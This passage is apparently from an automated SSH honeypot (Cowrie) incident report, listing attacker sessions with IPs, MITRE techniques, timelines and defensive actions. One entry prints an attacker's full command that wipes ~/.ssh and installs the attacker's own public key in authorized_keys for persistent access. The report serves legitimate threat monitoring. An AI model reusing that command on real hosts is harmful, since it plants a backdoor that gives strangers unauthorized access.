| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:58:19` | `cowrie.session.connect` |
| `2026-08-20 17:58:19` | `cowrie.client.version` |
| `2026-08-20 17:58:19` | `cowrie.client.kex` |
| `2026-08-20 17:58:19` | `cowrie.login.success` |
| `2026-08-20 17:58:20` | `cowrie.session.params` |
| `2026-08-20 17:58:20` | `cowrie.command.input` |
| `2026-08-20 17:58:20` | `cowrie.command.input` |
| `2026-08-20 17:58:20` | `cowrie.command.input` |
| `2026-08-20 17:58:20` | `cowrie.command.input` |
| `2026-08-20 17:58:20` | `cowrie.command.input` |
| `2026-08-20 17:58:20` | `cowrie.command.success` |
| `2026-08-20 17:58:20` | `cowrie.command.input` |
| `2026-08-20 17:58:20` | `cowrie.command.input` |
| `2026-08-20 17:58:20` | `cowrie.command.input` |
| `2026-08-20 17:58:20` | `cowrie.command.input` |
| `2026-08-20 17:58:20` | `cowrie.log.closed` |
| `2026-08-20 17:58:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0010d906269f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 18:01 |
| **Last Seen** | 2026-08-20 18:01 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:01:18` | `cowrie.session.connect` |
| `2026-08-20 18:01:18` | `cowrie.client.version` |
| `2026-08-20 18:01:18` | `cowrie.client.kex` |
| `2026-08-20 18:01:34` | `cowrie.login.success` |
| `2026-08-20 18:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a7e494bcb6d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 18:01 |
| **Last Seen** | 2026-08-20 18:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:01:42` | `cowrie.session.connect` |
| `2026-08-20 18:01:42` | `cowrie.client.version` |
| `2026-08-20 18:01:42` | `cowrie.client.kex` |
| `2026-08-20 18:01:44` | `cowrie.login.success` |
| `2026-08-20 18:01:45` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:01:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 18:01:52` | `cowrie.direct-tcpip.data` |
| `2026-08-20 18:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a71068626829

| Field | Detail |
|---|---|
| **Source IP** | `63.47.149[.]59` |
| **First Seen** | 2026-08-20 18:01 |
| **Last Seen** | 2026-08-20 18:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:01:47` | `cowrie.session.connect` |
| `2026-08-20 18:01:47` | `cowrie.client.version` |
| `2026-08-20 18:01:47` | `cowrie.client.kex` |
| `2026-08-20 18:01:49` | `cowrie.login.success` |
| `2026-08-20 18:01:50` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:01:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.47.149[.]59` to AbuseIPDB if not already reported
- [ ] Block `63.47.149[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6505ddc28a0a

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-08-20 18:01 |
| **Last Seen** | 2026-08-20 18:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:01:55` | `cowrie.session.connect` |
| `2026-08-20 18:01:55` | `cowrie.client.version` |
| `2026-08-20 18:01:55` | `cowrie.client.kex` |
| `2026-08-20 18:01:56` | `cowrie.login.success` |
| `2026-08-20 18:01:57` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:02:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-992dc0a2f591

| Field | Detail |
|---|---|
| **Source IP** | `221.199.172[.]66` |
| **First Seen** | 2026-08-20 18:10 |
| **Last Seen** | 2026-08-20 18:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:10:18` | `cowrie.session.connect` |
| `2026-08-20 18:10:18` | `cowrie.client.version` |
| `2026-08-20 18:10:18` | `cowrie.client.kex` |
| `2026-08-20 18:10:20` | `cowrie.login.success` |
| `2026-08-20 18:10:21` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:10:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.199.172[.]66` to AbuseIPDB if not already reported
- [ ] Block `221.199.172[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fa35e27b06e

| Field | Detail |
|---|---|
| **Source IP** | `222.139.245[.]137` |
| **First Seen** | 2026-08-20 18:10 |
| **Last Seen** | 2026-08-20 18:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:10:26` | `cowrie.session.connect` |
| `2026-08-20 18:10:27` | `cowrie.client.version` |
| `2026-08-20 18:10:27` | `cowrie.client.kex` |
| `2026-08-20 18:10:30` | `cowrie.login.success` |
| `2026-08-20 18:10:31` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:10:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.139.245[.]137` to AbuseIPDB if not already reported
- [ ] Block `222.139.245[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb3dec13618a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-20 18:11 |
| **Last Seen** | 2026-08-20 18:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:11:29` | `cowrie.session.connect` |
| `2026-08-20 18:11:29` | `cowrie.client.version` |
| `2026-08-20 18:11:29` | `cowrie.client.kex` |
| `2026-08-20 18:11:29` | `cowrie.login.success` |
| `2026-08-20 18:11:29` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:11:29` | `cowrie.direct-tcpip.data` |
| `2026-08-20 18:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b755553ca3f6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 18:12 |
| **Last Seen** | 2026-08-20 18:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:12:26` | `cowrie.session.connect` |
| `2026-08-20 18:12:26` | `cowrie.client.version` |
| `2026-08-20 18:12:26` | `cowrie.client.kex` |
| `2026-08-20 18:12:29` | `cowrie.login.success` |
| `2026-08-20 18:12:30` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:12:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 18:12:36` | `cowrie.direct-tcpip.data` |
| `2026-08-20 18:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec04c4c9bb6f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 18:12 |
| **Last Seen** | 2026-08-20 18:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:12:46` | `cowrie.session.connect` |
| `2026-08-20 18:12:46` | `cowrie.client.version` |
| `2026-08-20 18:12:47` | `cowrie.client.kex` |
| `2026-08-20 18:12:50` | `cowrie.login.success` |
| `2026-08-20 18:12:50` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:12:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 18:12:50` | `cowrie.direct-tcpip.data` |
| `2026-08-20 18:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-159696d9e9d7

| Field | Detail |
|---|---|
| **Source IP** | `217.150.37[.]249` |
| **First Seen** | 2026-08-20 18:13 |
| **Last Seen** | 2026-08-20 18:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:13:57` | `cowrie.session.connect` |
| `2026-08-20 18:13:58` | `cowrie.client.version` |
| `2026-08-20 18:13:58` | `cowrie.client.kex` |
| `2026-08-20 18:14:00` | `cowrie.login.success` |
| `2026-08-20 18:14:01` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.150.37[.]249` to AbuseIPDB if not already reported
- [ ] Block `217.150.37[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7a96c8b38fd

| Field | Detail |
|---|---|
| **Source IP** | `14.153.226[.]83` |
| **First Seen** | 2026-08-20 18:14 |
| **Last Seen** | 2026-08-20 18:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:14:07` | `cowrie.session.connect` |
| `2026-08-20 18:14:07` | `cowrie.client.version` |
| `2026-08-20 18:14:07` | `cowrie.client.kex` |
| `2026-08-20 18:14:09` | `cowrie.login.success` |
| `2026-08-20 18:14:10` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:14:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.153.226[.]83` to AbuseIPDB if not already reported
- [ ] Block `14.153.226[.]83` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-127127568549

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-08-20 18:16 |
| **Last Seen** | 2026-08-20 18:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:16:48` | `cowrie.session.connect` |
| `2026-08-20 18:16:48` | `cowrie.client.version` |
| `2026-08-20 18:16:48` | `cowrie.client.kex` |
| `2026-08-20 18:16:49` | `cowrie.login.success` |
| `2026-08-20 18:16:50` | `cowrie.session.params` |
| `2026-08-20 18:16:50` | `cowrie.command.input` |
| `2026-08-20 18:16:50` | `cowrie.command.failed` |
| `2026-08-20 18:16:50` | `cowrie.log.closed` |
| `2026-08-20 18:16:51` | `cowrie.session.params` |
| `2026-08-20 18:16:51` | `cowrie.command.input` |
| `2026-08-20 18:16:51` | `cowrie.session.file_download` |
| `2026-08-20 18:16:51` | `cowrie.log.closed` |
| `2026-08-20 18:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06fb371ed0df

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-08-20 18:16 |
| **Last Seen** | 2026-08-20 18:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:16:52` | `cowrie.session.connect` |
| `2026-08-20 18:16:52` | `cowrie.client.version` |
| `2026-08-20 18:16:52` | `cowrie.client.kex` |
| `2026-08-20 18:16:53` | `cowrie.login.success` |
| `2026-08-20 18:16:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e362e304f5f3

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-08-20 18:16 |
| **Last Seen** | 2026-08-20 18:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:16:53` | `cowrie.session.connect` |
| `2026-08-20 18:16:53` | `cowrie.client.version` |
| `2026-08-20 18:16:53` | `cowrie.client.kex` |
| `2026-08-20 18:16:54` | `cowrie.login.success` |
| `2026-08-20 18:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aa6c4ccc08d

| Field | Detail |
|---|---|
| **Source IP** | `208.96.233[.]67` |
| **First Seen** | 2026-08-20 18:19 |
| **Last Seen** | 2026-08-20 18:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:19:12` | `cowrie.session.connect` |
| `2026-08-20 18:19:12` | `cowrie.client.version` |
| `2026-08-20 18:19:12` | `cowrie.client.kex` |
| `2026-08-20 18:19:13` | `cowrie.login.success` |
| `2026-08-20 18:19:13` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.96.233[.]67` to AbuseIPDB if not already reported
- [ ] Block `208.96.233[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c3cfc2433e6

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-08-20 18:19 |
| **Last Seen** | 2026-08-20 18:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:19:23` | `cowrie.session.connect` |
| `2026-08-20 18:19:24` | `cowrie.client.version` |
| `2026-08-20 18:19:24` | `cowrie.client.kex` |
| `2026-08-20 18:19:26` | `cowrie.login.success` |
| `2026-08-20 18:19:27` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:19:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a814d53ae505

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 18:23 |
| **Last Seen** | 2026-08-20 18:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:23:31` | `cowrie.session.connect` |
| `2026-08-20 18:23:31` | `cowrie.client.version` |
| `2026-08-20 18:23:32` | `cowrie.client.kex` |
| `2026-08-20 18:23:35` | `cowrie.login.success` |
| `2026-08-20 18:23:37` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:23:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 18:23:39` | `cowrie.direct-tcpip.data` |
| `2026-08-20 18:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b55d2b1b451

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 18:23 |
| **Last Seen** | 2026-08-20 18:24 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:23:51` | `cowrie.session.connect` |
| `2026-08-20 18:23:51` | `cowrie.client.version` |
| `2026-08-20 18:23:52` | `cowrie.client.kex` |
| `2026-08-20 18:23:55` | `cowrie.login.success` |
| `2026-08-20 18:23:55` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:24:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 18:24:07` | `cowrie.direct-tcpip.data` |
| `2026-08-20 18:24:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bfcdf454add

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 18:34 |
| **Last Seen** | 2026-08-20 18:34 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:34:34` | `cowrie.session.connect` |
| `2026-08-20 18:34:34` | `cowrie.client.version` |
| `2026-08-20 18:34:35` | `cowrie.client.kex` |
| `2026-08-20 18:34:49` | `cowrie.login.success` |
| `2026-08-20 18:34:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f0fc4fad149

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 18:34 |
| **Last Seen** | 2026-08-20 18:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:34:53` | `cowrie.session.connect` |
| `2026-08-20 18:34:53` | `cowrie.client.version` |
| `2026-08-20 18:34:53` | `cowrie.client.kex` |
| `2026-08-20 18:34:57` | `cowrie.login.success` |
| `2026-08-20 18:34:59` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:34:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 18:34:59` | `cowrie.direct-tcpip.data` |
| `2026-08-20 18:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b3c291958a5

| Field | Detail |
|---|---|
| **Source IP** | `65.20.141[.]202` |
| **First Seen** | 2026-08-20 18:35 |
| **Last Seen** | 2026-08-20 18:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:35:04` | `cowrie.session.connect` |
| `2026-08-20 18:35:04` | `cowrie.client.version` |
| `2026-08-20 18:35:04` | `cowrie.client.kex` |
| `2026-08-20 18:35:06` | `cowrie.login.success` |
| `2026-08-20 18:35:06` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:35:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.141[.]202` to AbuseIPDB if not already reported
- [ ] Block `65.20.141[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fb903ddb176

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-08-20 18:35 |
| **Last Seen** | 2026-08-20 18:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:35:11` | `cowrie.session.connect` |
| `2026-08-20 18:35:12` | `cowrie.client.version` |
| `2026-08-20 18:35:12` | `cowrie.client.kex` |
| `2026-08-20 18:35:14` | `cowrie.login.success` |
| `2026-08-20 18:35:15` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:35:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb915fde3026

| Field | Detail |
|---|---|
| **Source IP** | `196.190.180[.]18` |
| **First Seen** | 2026-08-20 18:38 |
| **Last Seen** | 2026-08-20 18:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:38:17` | `cowrie.session.connect` |
| `2026-08-20 18:38:17` | `cowrie.client.version` |
| `2026-08-20 18:38:17` | `cowrie.client.kex` |
| `2026-08-20 18:38:19` | `cowrie.login.success` |
| `2026-08-20 18:38:19` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:38:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.180[.]18` to AbuseIPDB if not already reported
- [ ] Block `196.190.180[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e993c92baa8

| Field | Detail |
|---|---|
| **Source IP** | `182.139.39[.]150` |
| **First Seen** | 2026-08-20 18:38 |
| **Last Seen** | 2026-08-20 18:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
